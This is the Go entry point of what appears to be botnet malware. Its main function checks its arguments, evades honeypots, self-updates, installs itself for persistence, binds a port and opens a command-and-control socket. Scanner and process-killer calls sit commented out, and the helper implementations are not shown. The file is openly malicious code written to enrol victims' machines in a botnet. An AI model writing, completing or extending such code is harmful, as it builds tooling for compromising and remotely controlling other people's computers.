package main

import (
	"bot/lib/modules/update"
	"bot/lib/network"
	"bot/lib/security"
	"math/rand"
	"os"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		security.Kill()
		return
	}

	rand.Seed(time.Now().UnixNano())
	
	//scanner.InitScanner()
	
	security.EscapeHoneyPot()
	update.CheckForUpdate()
	
	//go security.StartKiller()
	security.Install()
	security.BindInstancePort()
	
	go network.CncSocket()
	select {}
}
